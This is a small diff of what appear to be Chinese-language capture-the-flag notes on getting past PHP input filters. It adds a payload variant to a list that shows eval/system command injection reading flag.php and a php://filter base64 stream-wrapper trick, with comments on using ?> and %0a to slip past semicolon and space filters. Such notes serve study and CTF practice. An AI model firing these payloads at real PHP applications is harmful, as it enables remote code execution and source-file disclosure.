@@ -92,4 +92,6 @@ c=eval($_GET[a]);&a=system('cat flag.php');//传入两个参数，c用于绕过�
 //使用?>可以绕过分号，作为语句结束。原理是php在检测到?>时，会在?>前的最后一个语句自动加上; 
 //php://filter/convert.base64-encode/resource=flag.php 是 PHP 中的一种流封装协议，允许你对流（例如文件读取）应用过滤器。这里就是对flag.php进行base64编码
 c=include%0a$_GET[1]?>&1=php://filter/convert.base64-encode/resource=flag.php 
+c=?><?=include$_GET[1]?>&1=php://filter/read=convert.base64-
+encode/resource=flag.php
 ```
